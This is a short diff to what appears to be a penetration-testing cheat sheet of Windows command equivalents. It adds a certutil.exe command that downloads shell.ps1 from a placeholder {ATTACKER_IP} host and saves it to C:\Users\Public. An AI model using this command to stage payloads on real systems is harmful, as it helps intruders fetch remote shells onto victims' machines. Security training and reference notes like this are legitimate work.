@@ -47,6 +47,12 @@ CMD equivalent of wget
 ```
 certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
 ```
+and choose location by setting the name afterwards:
+
+```
+certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1 C:\\Users\\Public\\shell.ps1
+```
+
 
 grep equivalent for cmd: `findstr`
 
